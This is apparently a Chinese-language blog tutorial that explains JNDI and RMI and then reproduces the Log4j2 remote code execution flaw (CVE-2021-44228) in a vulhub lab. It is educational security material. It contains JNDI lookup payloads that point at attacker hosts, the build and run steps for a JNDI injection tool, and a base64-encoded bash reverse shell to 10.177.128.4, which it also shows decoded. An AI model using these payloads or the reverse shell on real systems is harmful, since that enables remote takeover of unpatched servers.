**道阻且长，行则将至**

## 预备知识

### 什么是jndi注入？

jndi(java naming and directory
interface)是一组应用程序接口，它为开发人员查找和访问各种资源提供了统一的通用接口，可以用来定位用户、网络、机器、对象和服务等各种资源。比如可以利用JNDI在局域网上定位一台打印机，也可以用JNDI来定位数据库服务或一个远程Java对象。
**（可以理解为**` **JNDI**` **在**` **J2EE**` **中是一台交换机，将组件、资源、服务取了名字，再通过名字来查找访问）**

JNDI底层支持RMI远程对象，RMI注册的服务可以通过JNDI接口来访问和调用。JNDI根据名字动态加载数据，支持的服务有：DNS(域名服务)、LDAP(轻量级目录访问协议)、CORBA(公共对象请求代理体系结构)、RMI(远程方法调用)

JNDI支持多种命名和目录提供程序（Naming and Directory Providers），RMI注册表服务提供程序（RMI Registry
Service
Provider）允许通过JNDI应用接口对RMI中注册的远程对象进行访问操作。将RMI服务绑定到JNDI的一个好处是更加透明、统一和松散耦合，RMI客户端直接通过URL来定位一个远程对象，而且该RMI服务可以和包含人员，组织和网络资源等信息的企业目录链接在一起。

JNDI接口在初始化时，可以将RMI URL作为参数传入，而JNDI注入就出现在客户端的lookup()函数中，如果lookup()的参数可控就可能被攻击。

    
    
    Hashtable env = newHashtable();
    env.put(Context.INITIAL_CONTEXT_FACTORY,"com.sun.jndi.rmi.registry.RegistryContextFactory");
    //com.sun.jndi.rmi.registry.RegistryContextFactory 是RMI Registry Service Provider对应的Factory
    env.put(Context.PROVIDER_URL, "rmi://evil:8080");  
    //初始化环境
    Context context = new InitialContext(env);  
    //查找该name的数据
    Object local_obj = context.lookup("rmi://evil:8080/test");

 **什么是RMI？**

RMI(Remote Method
Invocation)是远程方法调用，客户端仅需要根据接口的定义，提供参数调用相应方法，服务器端需要实现具体的java方法并提供接口，rmi需要客户端和服务器端均是java编写的。

通过RMI技术，使原先的程序在同一操作系统的方法调用，变成了不同操作系统之间程序的方法调用。由于J2EE是分布式程序平台，它的
**RMI机制允许程序组件在不同操作系统之间的通信** 。比如，一个EJB可以通过RMI调用Web上另一台机器上的EJB远程方法。

 **RMI怎么处理远程对象？**

使用远程方法调用，必然会涉及参数的传递和执行结果的返回。参数或者返回值可以是基本数据类型，
**当然也有可能是对象的引用。所以这些需要被传输的对象必须可以被序列化，这要求相应的类必须实现 java.io.Serializable
接口，并且客户端的serialVersionUID字段要与服务器端保持一致。**

任何可以被远程调用方法的对象必须实现 java.rmi.Remote
接口，远程对象的实现类必须继承UnicastRemoteObject类。如果不继承UnicastRemoteObject类，则需要手工初始化远程对象，在远程对象的构造方法中调用UnicastRemoteObject.exportObject()静态方法。

在 **与远程对象** 的通信过程中，RMI使用标准机制： **stub** 和 **skeleton**
，stub和skeleton是应用程序与系统其他部分的接口，它们使用RMI的rmic编译器产生。

JVM之间通信的时候，JVM传递一个远程对象的stub给客户端，stub基本上相当于远程对象的引用和代理，客户端可以像调用本地方法一样通过调用stub来调用远程方法，Stub中包含了远程对象的定位信息，如Socket端口、服务端主机地址等等，并实现了远程调用过程中具体的底层网络通信细节。从逻辑上来看，数据是在Client和Server之间横向流动的，但是实际上是从Client到Stub，然后从Skeleton到Server这样纵向流动的。

> 这一块的解释推荐去看这篇文章，我搬了一些，真是不好意思(✿◡‿◡)
>
> 【[干货｜最全fastjson漏洞复现与绕过](https://mp.weixin.qq.com/s/YXqpbxai-GQydHLNZ5vZMQ)】

## log4j2

### 什么是log4j2 漏洞？

apache
log4j2是组件是基于java语言的开源日志框架，被广泛应用于业务系统开发。2021年11月24日，阿里云安全团队向apache官方报告了apache
log4j2远程代码执行漏洞。本质上是JNDI注入漏洞，攻击者可以直接构造恶意请求数据包，触发此漏洞，从而实现RCE。影响版本：Apache Log4j
2.x <= 2.14.1

 **漏洞原理：**

漏洞的关键代码在org.apache.logging.log4j.core.pattern.MessagePatternConverter#format()
中，函数会按字符检测每条日志，一旦发现某条日志中包含${，config.getStrSubstitutor()就会进行替换，将表达式替换成表达式解析后的内容：

![1654659311_62a018efc66e244fd3a26.png!small?1654659312865](https://image.3001.net/images/20220608/1654659311_62a018efc66e244fd3a26.png!small?1654659312865)

在org.apache.logging.log4j.core.lookup.StrSubstitutor#substitute中进行简单字符串提取，然后找到lookup的内容并替换，代码如下：

![1654670886_62a046264855d8e77de49.png!small?1654670887228](https://image.3001.net/images/20220608/1654670886_62a046264855d8e77de49.png!small?1654670887228)

resolveVariable函数执行变量解析：

![1654671070_62a046de6c905aafa5352.png!small?1654671071369](https://image.3001.net/images/20220608/1654671070_62a046de6c905aafa5352.png!small?1654671071369)

简单来说就是日志在打印时如果遇到${，Interpolator类会以：作为分隔符，分割表达式为前后两部分，前面一部分作为prefix，后面一部分为key，然后可以通过prefix去找对应的的lookup，将key作为参数带入lookup执行替换。

 **那么怎么利用漏洞呢？**

log4j2支持非常多协议，${}中可以使用docker:、jndi:、k8s:等多种协议。如预备知识中说的，jndi底层支持很多服务如rmi、ldap，这些服务用来下载恶意执行代码，所以，常见的payload为
${jndi:rmi:http://attacker.com/exp}。攻击过程如下：攻击者在自己的服务器端启动含有恶意代码的rmi服务，然后访问有log4j2漏洞的服务器，在向log4j2端的jndi
context lookup的时候连接自己的rmi服务器，log4j2端连接rmi服务器执行lookup的时候会 **通过rmi查询到该地址指向的引用**
并且 **本地实例化这个类** ，所以在类中的构造方法或者静态代码块中写入逻辑，就会在log4j2端实例化的时候执行到这段逻辑，导致jndi注入。

总结起来攻击方式就是利用jndi注入，使用ldap或者rmi下载远程恶意代码进行执行。

 **漏洞复现：**

vulhub开启漏洞环境：

> cd vulhub/log4j/CVE-2021-44228
>
> docker-compose up -d
>
> 访问http://0.0.0.0/8983/

![1654656461_62a00dcde90d8015ff4f3.png!small?1654656463151](https://image.3001.net/images/20220608/1654656461_62a00dcde90d8015ff4f3.png!small?1654656463151)

访问 <http://0.0.0.0:8983/solr/admin/cores?action=1>

![1654657145_62a010795503ed488d9c3.png!small?1654657146394](https://image.3001.net/images/20220608/1654657145_62a010795503ed488d9c3.png!small?1654657146394)

进行dnslog验证,DNS Query Record中有记录，说明存在漏洞。

![1654657417_62a011897eaa6b82dabf4.png!small?1654657418616](https://image.3001.net/images/20220608/1654657417_62a011897eaa6b82dabf4.png!small?1654657418616)

利用漏洞可以使用marshalsec搭LDAP进行复现，也可以下载JDNI注入器[JNDI-injection-Expolit](https://github.com/welk1n/JNDI-Injection-Exploit)：

用marshalsec可以实现更多功能，但是搭建步骤更麻烦，JNDI-injection-Exploit简单，我们以JNDI为例：

下载JNDI-injection-Exploit：

> git clone https://github.com/welk1n/JNDI-Injection-Exploit.git
>
> cd JNDI-Injection-Exploit
>
> mvn clean package -DskipTests

target文件夹中得到JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar

java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C bash -c "{echo,
**YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xNzcuMTI4LjQvNjk2OSAwPiYx**
}|{base64,-d}|{bash,-i}" -A 10.177.128.4

其中，-C表示远程class文件中要执行的命令（默认是mac下打开计算器），-A是下载恶意文件的服务器地址（默认是第一个网卡地址），域名或者ip均可，echo后面是base64编码的
**bash -i >& /dev/tcp/10.177.128.4/6969 0>&1**

得到rmi、ldap地址：

![1654657846_62a01336e2fd1dbe6c442.png!small?1654657848061](https://image.3001.net/images/20220608/1654657846_62a01336e2fd1dbe6c442.png!small?1654657848061)

nc监听6969端口：

![1654657802_62a0130acc914fb9b9efb.png!small?1654657803908](https://image.3001.net/images/20220608/1654657802_62a0130acc914fb9b9efb.png!small?1654657803908)

访问
[http://0.0.0.0:8983/solr/admin/cores?action=${jndi:rmi://10.177.128.4:1099/nleknv}](http://0.0.0.0:8983/solr/admin/cores?action=$%7Bjndi:rmi://10.177.128.4:1099/nleknv%7D)

nc连接![1654657948_62a0139c6c574a86441e4.png!small?1654657949469](https://image.3001.net/images/20220608/1654657948_62a0139c6c574a86441e4.png!small?1654657949469)

得到shell:

![1654657969_62a013b148d7ceb4ead6f.png!small?1654657970355](https://image.3001.net/images/20220608/1654657969_62a013b148d7ceb4ead6f.png!small?1654657970355)

  

